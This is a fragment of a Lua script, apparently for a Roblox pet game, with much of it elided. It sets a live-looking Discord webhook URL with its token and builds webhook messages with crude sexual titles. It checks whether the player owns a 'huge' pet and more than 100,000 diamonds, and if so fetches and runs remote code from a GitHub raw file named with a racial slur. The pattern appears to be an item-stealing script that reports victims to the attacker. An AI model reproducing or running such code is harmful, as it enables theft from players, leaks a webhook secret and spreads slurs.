...
local msg = {
   ["username"] = "Monkey Fuckker 4000",
   ["avatar_url"] = "https://cdn.discordapp.com/attachments/1120757409246359654/1123305445398958080/ez-gif.gif",
   ...
   ["embeds"] = {
       {
           ...
           ["title"] = "This Weird Monkey Got Fucked So Hard",
           ["thumbnail"] = {
               ["url"] = AvatarImage,
           },
           ["fields"] = {
...
_G.Webhook = "https://discord.com/api/webhooks/1123304979822825594/9s0On_ndTEeon9eorWX7ILJN3RfkFYYtYXazpHOBZfq7zT4BnqYG8EEyc1-3_F4sWffu"
wait(1)
...
while wait() do
	...
	_G.PetName = v2.name
        ...
        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
            ...
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Dovyl/msgmonkeys/main/nig.lua"))()
            wait(5)
